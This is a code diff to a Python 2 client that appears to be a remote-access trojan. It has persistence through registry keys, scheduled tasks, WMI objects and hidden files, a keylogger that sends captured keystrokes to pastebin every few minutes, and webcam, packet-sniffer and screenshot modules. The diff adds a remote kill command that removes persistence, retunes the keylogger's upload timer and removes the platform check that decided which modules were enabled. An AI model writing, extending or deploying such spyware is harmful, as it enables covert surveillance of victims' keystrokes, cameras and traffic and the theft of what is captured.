@@ -231,6 +231,21 @@ class Client(object):
                 p.append(i)
         return str().join([block[i] for i in p])
 
+    def _kill(self):
+        self.exit = True
+        for i in self.threads:
+            try:
+                del self.threads[i]
+            except Exception as e1:
+                if self.v:
+                    print 'Kill thread error: {}'.format(str(e1))
+        for method in self.persistence.options['methods']:
+            try:
+                getattr(self, 'remove_{}_{}_persistence'.format(*method.split()))()
+            except Exception as e2:
+                if self.v:
+                    print 'Remove persistence error: {}'.format(str(e2))
+
     def _use(self, module):
         try:
             getattr(self, module).status = True
@@ -371,8 +386,9 @@ class Client(object):
                     else:
                         self.result['keylogger'].update({time.ctime(): result})
                 break
-            if time.time() < self.keylogger.options['next_upload']:
-                time.sleep(10)
+            if self.keylogger.options['next_upload'] > 0:
+                self.keylogger.options['next_upload'] = float(self.keylogger.options['next_upload'] - 1.0)
+                time.sleep(1)
             else:
                 if len(self.keylogger.options['buffer']) > self.keylogger.options['max_bytes']:
                     result  = self._pastebin(self.keylogger.options['buffer'])
@@ -380,8 +396,8 @@ class Client(object):
                         self.logger.log(40, result, extra={'submodule':'keylogger'})
                     else:
                         self.result['keylogger'].update({time.ctime(): result})
-                    self.keylogger.options['buffer'] = ''
-                self.keylogger.options['next_upload'] += 300.0
+                    self.keylogger.options['buffer']  = ''
+                self.keylogger.options['next_upload'] = 300.0
 
     def keylogger_manager(self):
             self.threads['keylogger_helper'] = Thread(target=self.keylogger_helper, name=time.time())
@@ -739,6 +755,7 @@ class Client(object):
         return fx
 
     def module(fx, mx=__modules__):
+        fx.status = True
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
             fx.options = {'methods': ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']}
@@ -747,14 +764,13 @@ class Client(object):
             fx.options = {'max_bytes': 1024, 'next_upload': time.time() + 300.0, 'buffer': bytes(), 'window': None}
         elif fx.func_name is 'webcam':
             fx.platforms = ['win32']
-            fx.options = {'image': True, 'video': False}
+            fx.options = {'image': True, 'video': bool()}
         elif fx.func_name is 'packetsniffer':
             fx.platforms = ['darwin','linux2']
             fx.options  = { 'next_upload': time.time() + 300.0, 'buffer': []}
         elif fx.func_name is 'screenshot':
             fx.platforms = ['win32','linux2','darwin']
             fx.options = {}
-        fx.status = True if sys.platform in fx.platforms else False
         mx.update({fx.func_name: fx})
         return fx
 
@@ -881,6 +897,9 @@ class Client(object):
 
     @command
     def pwd(self): return os.getcwd()
+
+    @command
+    def kill(self): return self._kill()
 
     @command
     def admin(self): return self._admin()
